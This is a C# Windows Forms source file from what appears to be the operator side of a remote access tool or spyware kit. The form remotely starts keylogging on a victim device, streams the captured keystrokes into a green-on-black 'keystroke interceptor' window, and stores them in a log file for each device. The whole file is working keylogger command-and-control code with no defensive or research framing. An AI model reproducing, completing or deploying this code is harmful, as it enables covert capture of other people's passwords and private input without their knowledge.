using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace AntaryamiSetuAdmin
{
    public class KeystrokeForm : Form
    {
        private readonly ClientSession _session;
        private readonly string _logFilePath;

        private readonly Color ColBg = Color.FromArgb(5, 5, 5);
        private readonly Color ColPanel = Color.FromArgb(12, 12, 12);
        private readonly Color ColGreen = Color.FromArgb(0, 255, 64);
        private readonly Color ColCyan = Color.FromArgb(0, 200, 255);
        private readonly Color ColRed = Color.FromArgb(255, 30, 30);
        private readonly Color ColBorder = Color.FromArgb(0, 100, 30);

        private RichTextBox? _rtbLogs;
        private TextBox? _txtSearch;

        public KeystrokeForm(ClientSession session)
        {
            _session = session;
            
            string downloadsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "downloads");
            string targetFolder = Path.Combine(downloadsFolder, _session.DeviceId);
            if (!Directory.Exists(targetFolder)) Directory.CreateDirectory(targetFolder);
            _logFilePath = Path.Combine(targetFolder, "keystrokes.txt");

            InitializeGUI();
            LoadExistingLogs();

            // Wire up real-time packet handler callback
            _session.OnKeystrokesReceived = AppendKeystrokes;

            SendCommandDirect("keylog_start");
        }

        private void InitializeGUI()
        {
            this.Text = $"★ KEYLOG DECRYPTOR // {_session.DeviceName} ★";
            this.Size = new Size(800, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = ColBg;
            this.ForeColor = ColGreen;
            this.Font = new Font("Consolas", 10F, FontStyle.Regular);

            // Main layout panel
            TableLayoutPanel mainLayout = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 1,
                RowCount = 3,
                BackColor = Color.Transparent
            };
            mainLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, 50)); // Header
            mainLayout.RowStyles.Add(new RowStyle(SizeType.Absolute, 45)); // Tool bar
            mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 100)); // Log box
            this.Controls.Add(mainLayout);

            // 1. Header panel
            Panel pnlHeader = new Panel { Dock = DockStyle.Fill, BackColor = ColPanel, BorderStyle = BorderStyle.FixedSingle };
            Label lblTitle = new Label
            {
                Text = $"★ KEYSTROKE TELEMETRY INTERCEPTOR - {_session.DeviceName.ToUpper()} ★",
                Font = new Font("Consolas", 12F, FontStyle.Bold),
                ForeColor = ColCyan,
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleCenter
            };
            pnlHeader.Controls.Add(lblTitle);
            mainLayout.Controls.Add(pnlHeader, 0, 0);

            // 2. Toolbar panel
            Panel pnlToolbar = new Panel { Dock = DockStyle.Fill, BackColor = ColBg, Padding = new Padding(5) };
            
            Label lblSearch = new Label { Text = "SEARCH:", ForeColor = ColCyan, Location = new Point(10, 12), AutoSize = true, Font = new Font("Consolas", 9F, FontStyle.Bold) };
            _txtSearch = new TextBox { BackColor = ColPanel, ForeColor = ColGreen, BorderStyle = BorderStyle.FixedSingle, Location = new Point(70, 10), Width = 200, Font = new Font("Consolas", 10F) };
            _txtSearch.TextChanged += TxtSearch_TextChanged;

            Button btnClear = CreateToolButton("CLEAR LOGS", ColRed, new Point(this.Width - 280, 7), 120);
            btnClear.Click += BtnClear_Click;

            Button btnOpen = CreateToolButton("OPEN FOLDER", ColCyan, new Point(this.Width - 150, 7), 120);
            btnOpen.Click += (s, e) => {
                try {
                    System.Diagnostics.Process.Start("explorer.exe", $"/select,\"{_logFilePath}\"");
                } catch { }
            };

            pnlToolbar.Controls.Add(lblSearch);
            pnlToolbar.Controls.Add(_txtSearch);
            pnlToolbar.Controls.Add(btnClear);
            pnlToolbar.Controls.Add(btnOpen);
            mainLayout.Controls.Add(pnlToolbar, 0, 1);

            // 3. Log view box
            _rtbLogs = new RichTextBox
            {
                Dock = DockStyle.Fill,
                BackColor = ColPanel,
                ForeColor = ColGreen,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Consolas", 10.5F),
                ReadOnly = true
            };
            mainLayout.Controls.Add(_rtbLogs, 0, 2);
        }

        private Button CreateToolButton(string text, Color color, Point loc, int width)
        {
            Button btn = new Button
            {
                Text = text,
                Location = loc,
                Width = width,
                Height = 26,
                FlatStyle = FlatStyle.Flat,
                ForeColor = color,
                BackColor = ColBg,
                Font = new Font("Consolas", 8.5F, FontStyle.Bold),
                Cursor = Cursors.Hand,
                Anchor = AnchorStyles.Top | AnchorStyles.Right
            };
            btn.FlatAppearance.BorderColor = color;
            return btn;
        }

        private void LoadExistingLogs()
        {
            if (File.Exists(_logFilePath))
            {
                try
                {
                    string logs = File.ReadAllText(_logFilePath);
                    _rtbLogs!.Text = logs;
                    ScrollToBottom();
                }
                catch (Exception ex)
                {
                    _rtbLogs!.Text = $"[-] Failed to load existing logs: {ex.Message}\n";
                }
            }
        }

        private void AppendKeystrokes(string text)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => AppendKeystrokes(text)));
                return;
            }

            _rtbLogs!.AppendText(text);
            ScrollToBottom();
        }

        private void ScrollToBottom()
        {
            _rtbLogs!.SelectionStart = _rtbLogs.TextLength;
            _rtbLogs.SelectionLength = 0;
            _rtbLogs.ScrollToCaret();
        }

        private void TxtSearch_TextChanged(object? sender, EventArgs e)
        {
            string query = _txtSearch!.Text;
            _rtbLogs!.SelectAll();
            _rtbLogs.SelectionBackColor = ColPanel; // reset background

            if (string.IsNullOrEmpty(query)) return;

            int index = 0;
            while (index < _rtbLogs.TextLength)
            {
                int findIndex = _rtbLogs.Find(query, index, RichTextBoxFinds.None);
                if (findIndex == -1) break;

                _rtbLogs.SelectionStart = findIndex;
                _rtbLogs.SelectionLength = query.Length;
                _rtbLogs.SelectionBackColor = Color.FromArgb(0, 100, 150); // custom highlight color
                
                index = findIndex + query.Length;
            }
        }

        private void BtnClear_Click(object? sender, EventArgs e)
        {
            var confirmResult = MessageBox.Show("Are you sure to delete all stored keystroke logs for this device?",
                                     "Confirm Clear",
                                     MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (confirmResult == DialogResult.Yes)
            {
                try
                {
                    if (File.Exists(_logFilePath)) File.Delete(_logFilePath);
                    string idPath = Path.Combine(Path.GetDirectoryName(_logFilePath) ?? "", "keystrokes_last_id.txt");
                    if (File.Exists(idPath)) File.Delete(idPath);
                    _rtbLogs!.Clear();
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error clearing logs: {ex.Message}");
                }
            }
        }

        private void SendCommandDirect(string command)
        {
            if (!_session.IsActive) return;

            if (_session.IsHttp)
            {
                DashboardForm.SendHttpCommand(_session.DeviceId, command);
                return;
            }

            try
            {
                byte[] cmdBytes = Encoding.UTF8.GetBytes(command);
                _session.SendPacket(2, cmdBytes);
            }
            catch { }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            SendCommandDirect("keylog_stop");
            _session.OnKeystrokesReceived = null;
            base.OnFormClosing(e);
        }
    }
}
